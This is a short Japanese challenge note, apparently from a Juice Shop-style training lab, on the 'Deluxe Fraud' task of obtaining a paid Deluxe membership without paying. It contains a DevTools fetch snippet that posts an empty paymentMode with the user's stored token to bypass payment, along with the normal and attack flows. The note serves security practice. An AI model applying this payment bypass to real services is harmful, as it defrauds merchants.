# Deluxe Fraud ❌

**難易度:** ⭐⭐⭐
**カテゴリ:** 入力検証
**目標:** 支払い無しで Deluxe メンバーシップを取得

## ヒント

- **エンドポイント:** `POST /rest/deluxe-membership`
- **脆弱性:** `paymentMode` パラメータの検証不足
- **バイパス:** 空文字列を送信すると支払い処理をスキップ

## 攻撃コード

```javascript
// DevTools Console で実行
fetch('/rest/deluxe-membership', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({paymentMode: ''})
}).then(r => r.json()).then(console.log)
```

## 正常フロー

1. `/#/deluxe-membership` ページにアクセス
2. 支払い方法を選択（クレジットカード等）
3. 支払い処理

## 攻撃フロー

1. ログイン済みの状態で
2. API を直接叩いて `paymentMode: ''` を送信
3. 支払い処理をバイパス

## 検証ポイント

- [ ] Deluxe メンバーシップが有効化されたか
- [ ] 支払い履歴に記録がないか

## 解説

[未着手]
